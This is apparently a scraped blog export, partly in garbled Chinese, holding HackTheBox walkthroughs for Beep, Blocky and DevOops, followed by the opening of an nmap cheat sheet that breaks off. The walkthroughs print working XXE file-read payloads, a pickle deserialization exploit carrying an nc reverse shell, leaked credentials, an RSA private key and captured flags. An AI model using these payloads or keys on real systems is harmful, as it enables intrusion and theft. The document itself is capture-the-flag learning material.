user:&#x2F;:&#x2F;sbin&#x2F;nologinpostfix:x:89:89::&#x2F;var&#x2F;spool&#x2F;postfix:&#x2F;sbin&#x2F;nologinasterisk:x:100:101:Asterisk VoIP PBX:&#x2F;var&#x2F;lib&#x2F;asterisk:&#x2F;bin&#x2F;bashrpcuser:x:29:29:RPC Service User:&#x2F;var&#x2F;lib&#x2F;nfs:&#x2F;sbin&#x2F;nologinnfsnobody:x:65534:65534:Anonymous NFS User:&#x2F;var&#x2F;lib&#x2F;nfs:&#x2F;sbin&#x2F;nologinsshd:x:74:74:Privilege-separated SSH:&#x2F;var&#x2F;empty&#x2F;sshd:&#x2F;sbin&#x2F;nologinspamfilter:x:500:500::&#x2F;home&#x2F;spamfilter:&#x2F;bin&#x2F;bashhaldaemon:x:68:68:HAL daemon:&#x2F;:&#x2F;sbin&#x2F;nologinxfs:x:43:43:X Font Server:&#x2F;etc&#x2F;X11&#x2F;fs:&#x2F;sbin&#x2F;nologinfanis:x:501:501::&#x2F;home&#x2F;fanis:&#x2F;bin&#x2F;bashSorry! Attempt to access restricted file. ä½¿ç”¨fanis : jEhdIekWmdjEç™»å½•é¶æœºå‘ç°å¯†ç é”™è¯¯ï¼Œå†ä¸€çœ‹Writeupï¼Œç›´æ¥æ˜¯å¯ä»¥rootç™»å½•â€¦orz== 123456789101112131415161718# kali @ kali in ~/HackTheBox/Beep [9:19:31] $ ssh root@10.10.10.7root@10.10.10.7&#x27;s password: Last login: Tue Apr 7 16:20:42 2020 from 10.10.14.5Welcome to Elastix ----------------------------------------------------To access your Elastix System, using a separate workstation (PC/MAC/Linux)Open the Internet Browser using the following URL:http://10.10.10.7[root@beep ~]# iduid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)[root@beep ~]# cat /root/root.txt d88e006123842106982acce0aaf453f0[root@beep ~]# cat /home/fanis/user.txt aeff3def0c765c2677b94715cffa73ac","tags":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"http://ca0y1h.top/tags/%E9%9D%B6%E6%9C%BA/"}],"categories":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"http://ca0y1h.top/categories/%E9%9D%B6%E6%9C%BA/"},{"name":"HTB","slug":"é¶æœº/HTB","permalink":"http://ca0y1h.top/categories/%E9%9D%B6%E6%9C%BA/HTB/"}]},{"title":"HTB::Blocky Walkthrough","date":"2020-04-07T06:07:44.000Z","path":"Target_drone/HackTheBox/12.HTB-Blocky-walkthrough/","text":"HTB::Blocky Walkthrough 0x01 Info Card 0x02 Tools and Tips nmap dirsearch wpscan jad 0x03 Pentesting Initial Enumeration nmap scan 1234567891011121314151617181920Starting Nmap 7.80 ( https:&#x2F;&#x2F;nmap.org ) at 2019-11-14 10:54 CET Nmap scan report for 10.10.10.37 Host is up (0.085s latency). Not shown: 996 filtered ports PORT STATE SERVICE VERSION 21&#x2F;tcp open ftp ProFTPD 1.3.5a 22&#x2F;tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 d6:2b:99:b4:d5:e7:53:ce:2b:fc:b5:d7:9d:79:fb:a2 (RSA) | 256 5d:7f:38:95:70:c9:be:ac:67:a0:1e:86:e7:97:84:03 (ECDSA) |_ 256 09:d5:c2:04:95:1a:90:ef:87:56:25:97:df:83:70:67 (ED25519) 80&#x2F;tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-generator: WordPress 4.8 |_http-server-header: Apache&#x2F;2.4.18 (Ubuntu) |_http-title: BlockyCraft â€“ Under Construction! 8192&#x2F;tcp closed sophos Service Info: OSs: Unix, Linux; CPE: cpe:&#x2F;o:linux:linux_kernel Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; . Nmap done: 1 IP address (1 host up) scanned in 19.32 seconds dirsearch scan 123456789101112131415161718192021222324252627$ .&#x2F;dirsearch.py -u 10.10.10.37 -e * [08:44:06] 301 - 0B - &#x2F;index.php -&gt; http:&#x2F;&#x2F;10.10.10.37&#x2F; [08:44:09] 301 - 315B - &#x2F;javascript -&gt; http:&#x2F;&#x2F;10.10.10.37&#x2F;javascript&#x2F;[08:44:13] 200 - 19KB - &#x2F;license.txt [08:44:37] 301 - 315B - &#x2F;phpmyadmin -&gt; http:&#x2F;&#x2F;10.10.10.37&#x2F;phpmyadmin&#x2F;[08:44:41] 200 - 10KB - &#x2F;phpmyadmin&#x2F; [08:44:42] 301 - 312B - &#x2F;plugins -&gt; http:&#x2F;&#x2F;10.10.10.37&#x2F;plugins&#x2F;[08:44:46] 200 - 7KB - &#x2F;readme.html [08:44:52] 403 - 299B - &#x2F;server-status [08:44:52] 403 - 300B - &#x2F;server-status&#x2F;[08:45:21] 200 - 380B - &#x2F;wiki&#x2F;[08:45:21] 301 - 313B - &#x2F;wp-admin -&gt; http:&#x2F;&#x2F;10.10.10.37&#x2F;wp-admin&#x2F;[08:45:21] 301 - 309B - &#x2F;wiki -&gt; http:&#x2F;&#x2F;10.10.10.37&#x2F;wiki&#x2F;[08:45:21] 302 - 0B - &#x2F;wp-admin&#x2F; -&gt; http:&#x2F;&#x2F;10.10.10.37&#x2F;wp-login.php?redirect_to&#x3D;http%3A%2F%2F10.10.10.37%2Fwp-admin%2F&amp;reauth&#x3D;1[08:45:22] 200 - 1KB - &#x2F;wp-admin&#x2F;install.php[08:45:22] 500 - 4KB - &#x2F;wp-admin&#x2F;setup-config.php[08:45:22] 200 - 0B - &#x2F;wp-content&#x2F;[08:45:22] 301 - 315B - &#x2F;wp-content -&gt; http:&#x2F;&#x2F;10.10.10.37&#x2F;wp-content&#x2F;[08:45:23] 200 - 69B - &#x2F;wp-content&#x2F;plugins&#x2F;akismet&#x2F;akismet.php[08:45:23] 200 - 965B - &#x2F;wp-content&#x2F;uploads&#x2F;[08:45:23] 301 - 316B - &#x2F;wp-includes -&gt; http:&#x2F;&#x2F;10.10.10.37&#x2F;wp-includes&#x2F;[08:45:23] 500 - 0B - &#x2F;wp-includes&#x2F;rss-functions.php[08:45:23] 200 - 2KB - &#x2F;wp-login.php[08:45:23] 200 - 40KB - &#x2F;wp-includes&#x2F;[08:45:24] 405 - 42B - &#x2F;xmlrpc.php Task Completed wpscan 123456789101112131415161718[i] User(s) Identified:[+] notch | Found By: Author Posts - Author Pattern (Passive Detection) | Confirmed By: | Wp Json Api (Aggressive Detection) | - http:&#x2F;&#x2F;10.10.10.37&#x2F;index.php&#x2F;wp-json&#x2F;wp&#x2F;v2&#x2F;users&#x2F;?per_page&#x3D;100&amp;page&#x3D;1 | Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Login Error Messages (Aggressive Detection)[+] Notch | Found By: Rss Generator (Passive Detection) | Confirmed By: Login Error Messages (Aggressive Detection)[+] WPVulnDB API OK | Plan: free | Requests Done (during the scan): 3 | Requests Remaining: 47 Getting User Access Visit http://10.10.10.37/plugin Download and extract BlockyCore.jar, once the BlockCore.class is extracted we need to do to print out itâ€™s contents is to use the jad command. 12345678910111213141516171819202122232425262728293031323334353637383940$ jad BlockyCore.classParsing BlockyCore.class...The class file version is 52.0 (only 45.3, 46.0 and 47.0 are supported)Generating BlockyCore.jad$ cat BlockyCore.jad&#x2F;&#x2F; Decompiled by Jad v1.5.8e. Copyright 2001 Pavel Kouznetsov.&#x2F;&#x2F; Jad home page: http:&#x2F;&#x2F;www.geocities.com&#x2F;kpdus&#x2F;jad.html&#x2F;&#x2F; Decompiler options: packimports(3)&#x2F;&#x2F; Source File Name: BlockyCore.java package com.myfirstplugin;public class BlockyCore&#123; public BlockyCore() &#123; sqlHost &#x3D; &quot;localhost&quot;; sqlUser &#x3D; &quot;root&quot;; sqlPass &#x3D; &quot;8YsqfCTnvxAUeduzjNSXe22&quot;; &#125; public void onServerStart() &#123; &#125; public void onServerStop() &#123; &#125; public void onPlayerJoin() &#123; sendMessage(&quot;TODO get username&quot;, &quot;Welcome to the BlockyCraft!!!!!!!&quot;); &#125; public void sendMessage(String s, String s1) &#123; &#125; public String sqlHost; public String sqlUser; public String sqlPass;&#125; Get the credentials: notch : 8YsqfCTnvxAUeduzjNSXe22 SSH with notch 123456789101112131415161718$ ssh notch@10.10.10.37notch@10.10.10.37&#39;s password: Welcome to Ubuntu 16.04.2 LTS (GNU&#x2F;Linux 4.4.0-62-generic x86_64) * Documentation: https:&#x2F;&#x2F;help.ubuntu.com * Management: https:&#x2F;&#x2F;landscape.canonical.com * Support: https:&#x2F;&#x2F;ubuntu.com&#x2F;advantage7 packages can be updated.7 updates are security updates.Last login: Tue Jul 25 11:14:53 2017 from 10.10.14.230notch@Blocky:~$ iduid&#x3D;1000(notch) gid&#x3D;1000(notch) groups&#x3D;1000(notch),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)notch@Blocky:~$ lsminecraft user.txtnotch@Blocky:~$ cat user.txt 59fee0977fb60b8a0bc6e41e751f3cd5 Getting Root Access 1234567891011121314notch@Blocky:~$ cat .bash_history sudo sucat .bash_history echo &quot;&quot; &gt; .bash_history exitpoweroffsudo poweroffnotch@Blocky:~$ sudo -l[sudo] password for notch: Matching Defaults entries for notch on Blocky: env_reset, mail_badpass, secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\\:&#x2F;usr&#x2F;local&#x2F;bin\\:&#x2F;usr&#x2F;sbin\\:&#x2F;usr&#x2F;bin\\:&#x2F;sbin\\:&#x2F;bin\\:&#x2F;snap&#x2F;binUser notch may run the following commands on Blocky: (ALL : ALL) ALL Get root flag 1234notch@Blocky:~$ cat &#x2F;root&#x2F;root.txtcat: &#x2F;root&#x2F;root.txt: Permission deniednotch@Blocky:~$ sudo suroot@Blocky:&#x2F;home&#x2F;notch# cat &#x2F;root&#x2F;root.txt 0x04 Conclusion 0x05 Reference https://ech1.netlify.com/htb/easy/1","tags":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"http://ca0y1h.top/tags/%E9%9D%B6%E6%9C%BA/"}],"categories":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"http://ca0y1h.top/categories/%E9%9D%B6%E6%9C%BA/"},{"name":"HTB","slug":"é¶æœº/HTB","permalink":"http://ca0y1h.top/categories/%E9%9D%B6%E6%9C%BA/HTB/"}]},{"title":"HTB::DevOops Walkthrough","date":"2020-03-30T07:19:41.000Z","path":"Target_drone/HackTheBox/11.HTB-DevOops-walkthrough/","text":"HTB::DevOops Walkthrough 0x01 Info Card 0x02 Preliminary Python unserialize https://r1dd1er.top/2019/05/21/pythonå®‰å…¨ä¹‹ååºåˆ—åŒ–/ http://bendawang.site/2018/03/01/å…³äºPython-secçš„ä¸€äº›æ€»ç»“/ https://www.k0rz3n.com/2018/11/12/ä¸€ç¯‡æ–‡ç« å¸¦ä½ ç†è§£æ¼æ´ä¹‹Python ååºåˆ—åŒ–æ¼æ´/ http://www.code2sec.com/python-picklede-ren-yi-dai-ma-zhi-xing-lou-dong-shi-jian-he-payloadgou-zao.html é¶åœºï¼šhttps://github.com/vulhub/vulhub/tree/master/python/unpickle XXE Injection https://ca0y1h.top/Web_security/basic_learning/20.xxeæ¼æ´åˆ©ç”¨/ 0x03 Tools and Tips nmap dirsearch wfuzz Python pickle unserialize XXE read files Git 0x04 Pentesting Initial Enumeration nmap scan 1234567891011121314151617# Nmap 7.80 scan initiated Tue Mar 24 09:04:48 2020 as: nmap -sC -sV -oN ippsec_scan.txt 10.10.10.91Nmap scan report for 10.10.10.91Host is up (0.32s latency).Not shown: 998 closed portsPORT STATE SERVICE VERSION22&#x2F;tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 42:90:e3:35:31:8d:8b:86:17:2a:fb:38:90:da:c4:95 (RSA)| 256 b7:b6:dc:c4:4c:87:9b:75:2a:00:89:83:ed:b2:80:31 (ECDSA)|_ 256 d5:2f:19:53:b2:8e:3a:4b:b3:dd:3c:1f:c0:37:0d:00 (ED25519)5000&#x2F;tcp open http Gunicorn 19.7.1|_http-server-header: gunicorn&#x2F;19.7.1|_http-title: Site doesn&#39;t have a title (text&#x2F;html; charset&#x3D;utf-8).Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernelService detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .# Nmap done at Tue Mar 24 09:05:52 2020 -- 1 IP address (1 host up) scanned in 64.19 seconds 5000 port run as Python web server gunicornï¼Œdirsearch and wfuzz scan directory 12345678$ .&#x2F;dirsearch -u http:&#x2F;&#x2F;10.10.10.91:5000&#x2F; -e *Target: http:&#x2F;&#x2F;10.10.10.91:5000&#x2F;[02:21:18] Starting: [02:24:47] 200 - 533KB - &#x2F;feed[02:27:26] 200 - 347B - &#x2F;uploadTask Completed 12345$ wfuzz --hc&#x3D;404 -z file,&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-2.3-medium.txt http:&#x2F;&#x2F;10.10.10.91:5000&#x2F;FUZZ...000000126: 200 1815 L 24122 517022 Ch &quot;feed&quot;000000366: 200 0 L 39 W 347 Ch &quot;upload&quot;000019602: 405 4 L 23 W 178 Ch &quot;newpost&quot; Getting User Flag visit the homepage 1234567891011121314&lt;html&gt; &lt;body&gt; Under construction!&lt;br&gt; &lt;p&gt; This is feed.py, which will become the MVP for Blogfeeder application. &lt;/p&gt; &lt;p&gt; TODO: replace this with the proper feed from the dev.solita.fi backend. &lt;/p&gt; &lt;p&gt; &lt;img src=&quot;/feed&quot; align=&quot;center&quot; width=&quot;60%&quot; height=&quot;60%&quot;&gt; &lt;/p&gt; &lt;/body&gt;&lt;/html&gt; visit http://10.10.10.91:5000/upload, it should upload xml file including Author, Subject, Content elements. Try to upload a normal xml file. 123456&lt;?xml version=&quot;1.0&quot;?&gt;&lt;body&gt; &lt;Author&gt;author&lt;/Author&gt; &lt;Subject&gt;subject&lt;/Subject&gt; &lt;Content&gt;content&lt;/Content&gt;&lt;/body&gt; return a comfirmation and file path. 1PROCESSED BLOGPOST: Author: author Subject: subject Content: content URL for later reference: &#x2F;uploads&#x2F;test.xml File path: &#x2F;home&#x2F;roosa&#x2F;deploy&#x2F;src now, I try to upload an evil xml file that can read files 1234567&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE Author [&lt;!ENTITY file SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;Author&gt; &lt;Subject&gt;ca01h&lt;/Subject&gt; &lt;Content&gt;njupt&lt;/Content&gt; &amp;file;&lt;/Author&gt; Visit http://10.10.10.91:5000/uploads/evil.xml, success to return /etc/passwd file. 123PROCESSED BLOGPOST: Author: njupt root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin......roosa:x:1002:1002:,,,:&#x2F;home&#x2F;roosa:&#x2F;bin&#x2F;bash sshd:x:121:65534::&#x2F;var&#x2F;run&#x2F;sshd:&#x2F;usr&#x2F;sbin&#x2F;nologin blogfeed:x:1003:1003:,,,:&#x2F;home&#x2F;blogfeed:&#x2F;bin&#x2F;false Subject: ca01h Content: njupt URL for later reference: &#x2F;uploads&#x2F;evil.xml File path: &#x2F;home&#x2F;roosa&#x2F;deploy&#x2F;src ç»“åˆé¦–é¡µçš„feed.pyæç¤ºï¼Œä»¥åŠä¸Šä¼ æˆåŠŸåçš„ä¿¡æ¯/home/roosa/deploy/srcï¼ŒçŒœæµ‹ç½‘ç«™çš„æºç åº”è¯¥æ˜¯æ”¾åœ¨è¿™ä¸ªç›®å½•ï¼Œç„¶åæˆ‘ä»¬å°è¯•è®¿é—®/home/roosa/deploy/src/feed.py 1234567891011121314151617181920212223242526def uploaded_file(filename): return send_from_directory(Config.UPLOAD_FOLDER, filename) @app.route(&quot;&#x2F;&quot;) def xss(): return template(&#39;index.html&#39;) @app.route(&quot;&#x2F;feed&quot;) def fakefeed(): return send_from_directory(&quot;.&quot;,&quot;devsolita-snapshot.png&quot;) @app.route(&quot;&#x2F;newpost&quot;, methods&#x3D;[&quot;POST&quot;]) def newpost(): # TODO: proper save to database, this is for testing purposes right now picklestr &#x3D; base64.urlsafe_b64decode(request.data) # return picklestr postObj &#x3D; pickle.loads(picklestr) return &quot;POST RECEIVED: &quot; + postObj[&#39;Subject&#39;] ## TODO: VERY important! DISABLED THIS IN PRODUCTION #app &#x3D; DebuggedApplication(app, evalex&#x3D;True, console_path&#x3D;&#39;&#x2F;debugconsole&#39;) # TODO: Replace run-gunicorn.sh with real Linux service script #app &#x3D; DebuggedApplication(app, evalex&#x3D;True, console_path&#x3D;&#39;&#x2F;debugconsole&#39;) if __name__ &#x3D;&#x3D; &quot;__main__&quot;: app.run(host&#x3D;&#39;0.0.0,0&#39;, Debug&#x3D;True) æœ‰äº†å‰é¢Pythonååºåˆ—åŒ–çš„åŸºç¡€ï¼Œå°±å¾ˆå®¹æ˜“çœ‹å‡ºæ¥postObj = pickle.loads(picklestr) è¿™æ¡è¯­å¥å­˜åœ¨ååºåˆ—åŒ–æ¼æ´ã€‚å†™ä¸€ä¸ªPythonè„šæœ¬åå¼¹shellï¼š 12345678910111213141516171819import pickleimport requestsimport osimport base64url = &quot;http://10.10.10.91:5000/newpost&quot;headers = &#123;&quot;Content-Type&quot;: &quot;text/plain&quot;&#125;code = &#x27;rm /tmp/x;mkfifo /tmp/x;cat /tmp/x|/bin/sh -i 2&gt;&amp;1|nc 10.10.16.99 9000 &gt;/tmp/x&#x27;class Devoops(object): def __reduce__(self): return (os.system, (code,))payload = base64.urlsafe_b64encode(pickle.dumps(Devoops()))print(payload)r = requests.post(url=url, data=payload, headers=headers, allow_redirects=False)print(r.text) ä¸€å®šè¦ç”¨Python2æ‰§è¡Œè„šæœ¬ï¼Œå› ä¸ºpy2å’Œpy3åºåˆ—åŒ–åçš„ç»“æœæ˜¯å®Œå…¨ä¸ä¸€æ ·çš„ æœ¬æœºç›‘å¬ç«¯å£ 1234567891011121314$ nc -lvvp 9000 listening on [any] 9000 ...10.10.10.91: inverse host lookup failed: Unknown hostconnect to [10.10.16.99] from (UNKNOWN) [10.10.10.91] 44014&#x2F;bin&#x2F;sh: 0: can&#39;t access tty; job control turned off$ iduid&#x3D;1002(roosa) gid&#x3D;1002(roosa) groups&#x3D;1002(roosa),4(adm),27(sudo)$ python -c &quot;import pty;pty.spawn(&#39;&#x2F;bin&#x2F;bash&#39;)&quot;roosa@gitter:~&#x2F;deploy&#x2F;src$ ididuid&#x3D;1002(roosa) gid&#x3D;1002(roosa) groups&#x3D;1002(roosa),4(adm),27(sudo)roosa@gitter:~&#x2F;deploy&#x2F;src$ cd &amp;&amp; ls -a user.txtcd &amp;&amp; ls -a user.txtuser.txt è¿˜æœ‰ä¸€ç§æ›´ç®€å•çš„æ–¹æ³•ã€‚å¯¹äºç›®æ ‡é¶æœºåªæœ‰åªè¯»çš„è®¿é—®æƒé™ï¼Œè¿™ç¯‡æ–‡ç« æç¤ºäº†æˆ‘ä»¬åº”æŸ¥æ‰¾çš„æ–‡ä»¶ã€‚ åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥è®¿é—®roosaä¸»ç›®å½•çš„id_rsaæ–‡ä»¶ï¼š 1234567&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE Author [&lt;!ENTITY file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;home&#x2F;roosa&#x2F;.ssh&#x2F;id_rsa&quot;&gt;]&gt;&lt;Author&gt; &lt;Subject&gt;ca01h&lt;&#x2F;Subject&gt; &lt;Content&gt;njupt&lt;&#x2F;Content&gt; &amp;file;&lt;&#x2F;Author&gt; è·å–åä¿å­˜åˆ°æœ¬æœºï¼Œç”¨sshç™»å½•é¶æœºï¼š 12345678910111213141516171819202122232425262728# kali @ kali in ~&#x2F;HackTheBox&#x2F;DevOops [2:01:04] $ chmod 600 id_rsa # kali @ kali in ~&#x2F;HackTheBox&#x2F;DevOops [2:01:19] $ ssh -i id_rsa roosa@10.10.10.91The authenticity of host &#39;10.10.10.91 (10.10.10.91)&#39; can&#39;t be established.ECDSA key fingerprint is SHA256:hbD2D4PdnIVpAFHV8sSAbtM0IlTAIpYZ&#x2F;nwspIdp4Vg.Are you sure you want to continue connecting (yes&#x2F;no&#x2F;[fingerprint])? yesWarning: Permanently added &#39;10.10.10.91&#39; (ECDSA) to the list of known hosts.Welcome to Ubuntu 16.04.4 LTS (GNU&#x2F;Linux 4.13.0-37-generic i686) * Documentation: https:&#x2F;&#x2F;help.ubuntu.com * Management: https:&#x2F;&#x2F;landscape.canonical.com * Support: https:&#x2F;&#x2F;ubuntu.com&#x2F;advantage135 packages can be updated.60 updates are security updates.The programs included with the Ubuntu system are free software;the exact distribution terms for each program are described in theindividual files in &#x2F;usr&#x2F;share&#x2F;doc&#x2F;*&#x2F;copyright.Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted byapplicable law.roosa@gitter:~$ iduid&#x3D;1002(roosa) gid&#x3D;1002(roosa) groups&#x3D;1002(roosa),4(adm),27(sudo) Getting Root Flag æˆåŠŸç™»å½•ä¹‹åï¼Œçœ‹ä¸€ä¸‹.bash_historyï¼Œæœ‰å‡ ä¸ªå…³é”®çš„gitå‘½ä»¤ 1234567891011121314151617...mkdir integration&#x2F;auth_credentials.keynano integration&#x2F;auth_credentials.key&#x2F;ls -altrchmod go-rwx authcredentials.key...rm -Rf resources&#x2F;integration&#x2F;auth_credentials.keymv resources&#x2F;authcredentials.key resources&#x2F;integration&#x2F;git add resources&#x2F;integration&#x2F;authcredentials.key git commit -m &#39;add key for feed integration from tnerprise backend&#39;...ssh-keygen...cat kakcp kak resources&#x2F;integration&#x2F;authcredentials.key git add resources&#x2F;integration&#x2F;authcredentials.key git commit -m &#39;reverted accidental commit with proper key&#39; å»gitæœ¬åœ°ä»“åº“çœ‹ä¸€ä¸‹æäº¤å†å² 123456789roosa@gitter:~&#x2F;work&#x2F;blogfeed$ git log --pretty&#x3D;oneline7ff507d029021b0915235ff91e6a74ba33009c6d Use Base64 for pickle feed loading26ae6c8668995b2f09bf9e2809c36b156207bfa8 Set PIN to make debugging faster as it will no longer change every time the application code is changed. Remember to remove before production use.cec54d8cb6117fd7f164db142f0348a74d3e9a70 Debug support added to make development more agile.ca3e768f2434511e75bd5137593895bd38e1b1c2 Blogfeed app, initial version.dfebfdfd9146c98432d19e3f7d83cc5f3adbfe94 Gunicorn startup script33e87c312c08735a02fa9c796021a4a3023129ad reverted accidental commit with proper keyd387abf63e05c9628a59195cec9311751bdb283f add key for feed integration from tnerprise backend1422e5a04d1b52a44e6dc81023420347e257ee5f Initial commit å›é€€åˆ°ç¬¬äºŒä¸ªcommitç‰ˆæœ¬ 1234567891011121314151617181920212223242526272829303132333435roosa@gitter:~&#x2F;work&#x2F;blogfeed&#x2F;resources&#x2F;integration$ git reset --hard d387abf63e05c9628a59195cec9311751bdb283fHEAD is now at d387abf add key for feed integration from tnerprise backendroosa@gitter:~&#x2F;work&#x2F;blogfeed&#x2F;resources&#x2F;integration$ ls -latotal 12drwxrwxr-x 2 roosa roosa 4096 Mar 30 02:42 .drwxrwxr-x 3 roosa roosa 4096 Mar 30 02:39 ..-rw-rw-r-- 1 roosa roosa 1676 Mar 30 02:42 authcredentials.keyroosa@gitter:~&#x2F;work&#x2F;blogfeed&#x2F;resources&#x2F;integration$ cat authcredentials.key -----BEGIN RSA PRIVATE KEY-----MIIEogIBAAKCAQEArDvzJ0k7T856dw2pnIrStl0GwoU&#x2F;WFI+OPQcpOVj9DdSIEde8PDgpt&#x2F;tBpY7a&#x2F;xt3sP5rD7JEuvnpWRLteqKZ8hlCvt+4oP7DqWXoo&#x2F;hfaUUyU5ivr+5Ui0nD+YBKyYuiN+4CB8jSQvwOG+LlA3IGAzVf56J0WP9FILH&#x2F;NwYW2iovTRKnz1y2vdO3ug94XX8y0bbMR9Mtpj292wNrxmUSQ5glioqrSrwFfevWt&#x2F;rEgIVmrb+CCjeERnxMwaZNFP0SYoiC5HweyXD6ZLgFO4uOVuImILGJyyQJ8u5BI2mc&#x2F;SHSE0cF9DmYwbVqRcurk3yAS+jEbXgObupXkDHgIoMCwIDAQABAoIBAFaUuHIKVT+UK2oHuzjPbIdyEkDc3PAYP+E&#x2F;jdqy2eFdofJKDocOf9BDhxKlmO968PxoBe25jjjt0AALgCfN5I+xZGH19V4HPMCrK6PzskYII3&#x2F;i4K7FEHMn8ZgDZpj7U69Iz2l9xa4lyzeDk2X0256DbRv&#x2F;ZYaWPhX+fGw3dCMWkRs6MoBNVS4wAMmOCiFl3hzHlgIemLMm6QSyNnTtLPXwkS84KMfZGbnolAiZbHAqhe5cRfV2CVw2U8GaIS3fqV3ioD0qqQjIIPNMHSRik2J&#x2F;7Y7OuBRQN+auzFKV7QeLFeROJsLhLaPhstY5QQReQr9oIuTAs9c+oCLa2fXe3kkCgYEA367aoOTisun9UJ7ObgNZTDPeaXajhWrZbxlSsOeOBp5CK&#x2F;oLc0RBGLEKU6HtUuKFvlXdJ22S4&#x2F;rQb0RiDcU&#x2F;wOiDzmlCTQJrnLgqzBwNXp+MH6Av9WHGjwrjv&#x2F;loHYF0vXUHHRVJmcXzsftZk2aJ29TXud5UMqHovyieb3mZ0pcCgYEAxR41IMq2dif3laGnQuYrjQVNFfvwDt1JD1mKNG8OppwTgcPbFO+R3+MqL7lvAhHjWKMw+XjmkQEZbnmwf1fKuIHW9uD9KxxHqgucNv9ySuMtVPp&#x2F;QYtjn&#x2F;ltojR16JNTKqiW7vSqlsZnT9jR2syvuhhVz4Ei9yA&#x2F;VYZG2uiCpK0CgYA&#x2F;UOhz+LYu&#x2F;MsGoh0+yNXjGx+O7NU2s9sedqWQi8sJFo0Wk63gD+b5TUvmBoT+HD7NdNKoEX0t6VZM2KeEzFvSiD6fE+5&#x2F;i&#x2F;rYHs2Gfz5NlY39ecN5ixbAcM2tDrUo&#x2F;PcFlfXQhrERxRXJQKPHdJP7VRFHfKaKuof+bEoEtgATuwKBgC3Ce3bnWEBJuvIjmt6u7EFKj8CgwfPRbxp&#x2F;INRXS8Flzil7vCo6C1U8ORjnJVwHpw12pPHlHTFgXfUFjvGhAdCfY7XgOSV+5SwWkec6md&#x2F;EqUtm84&#x2F;VugTzNH5JS234dYAbrx498jQaTvV8UgtHJSxAZftL8UAJXmqOR3ieLWXpAoGADMbq4aFzQuUPldxr3thx0KRz9LJUJfrpADAUbxo8zVvbwt4gM2vsXwczoAvexd1JRMkbC7YOgrzZ9iOxHP+mg&#x2F;LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLwLS4O7JPRqVmgZzUUnDiAVuUHWuHGGXpWpz9EGau6dIbQaUUSOEE&#x3D;-----END RSA PRIVATE KEY----- æ‹·è´åˆ°æœ¬æœºä¿å­˜ï¼Œå†ç”¨sshç™»å½•é¶æœº 123456789101112131415161718$ chmod 600 root_id_rsa # kali @ kali in ~&#x2F;HackTheBox&#x2F;DevOops [2:44:48] $ ssh -i root_id_rsa root@10.10.10.91Welcome to Ubuntu 16.04.4 LTS (GNU&#x2F;Linux 4.13.0-37-generic i686) * Documentation: https:&#x2F;&#x2F;help.ubuntu.com * Management: https:&#x2F;&#x2F;landscape.canonical.com * Support: https:&#x2F;&#x2F;ubuntu.com&#x2F;advantage135 packages can be updated.60 updates are security updates.Last login: Mon Mar 26 06:23:48 2018 from 192.168.57.1root@gitter:~# iduid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)root@gitter:~# cat root.txt d4fe1e7f7187407eebdd3209cb1ac7b3 0x05 Reference https://epi052.gitlab.io/notes-to-self/blog/2018-10-11-hack-the-box-devoops/","tags":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"http://ca0y1h.top/tags/%E9%9D%B6%E6%9C%BA/"}],"categories":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"http://ca0y1h.top/categories/%E9%9D%B6%E6%9C%BA/"},{"name":"HTB","slug":"é¶æœº/HTB","permalink":"http://ca0y1h.top/categories/%E9%9D%B6%E6%9C%BA/HTB/"}]},{"title":"Linux-Enumeration","date":"2020-03-26T12:26:01.000Z","path":"Other/6.Linux-Enumeration/","text":"æ›´æ–°ä¸­â€¦ Linux Enumeration ä¿¡æ¯æœé›† Nmap ä½¿ç”¨æ‰‹å†Œï¼šhttps://www.stationx.net/nmap-cheat-sheet/ å¸¸ç”¨å‚æ•° Target Selection: nmap 192.168.0.1(scanning a single ip address) nmap ca0y1h.top(scanning an url directly) nmap 192.168.0.0/24(scan a range of IPs (192.168.0.0-255)) nmap -iL list-of-ips.txt(scan a list of ip) Port Selection: nmap 127.0.0.1 -p 22(scanning the default SSH port) nmap 127.0.0.1 -p 1-1024(scanning ports 1 2 3â€¦1024) nmap 127.0.0.1 -F(scanning the most 100 common ports (80,22,21,443,etc)) nmap 127.0.0.1 -F --top-ports 30000 nmap 127.0.0.1 -p-(all ports) Port Scan Types: nmap 127.0.0.1 -sT (using TCP (used by default)) nmap 127.0.0.1 -sS (TCP SYN scan) nmap 127.0.0.1 -sU (UDP ports) nmap 127.0.0.1 -Pn -F (skip the initial ping step) Service &amp; OS Detection nmap 127.0.0.1 -A(detect OS &amp; services) nmap 127.0.0.1 -sV(enumerate versions) nmap 127.0.0.1 -sC(using default scripts) nmap 127.0.0.1 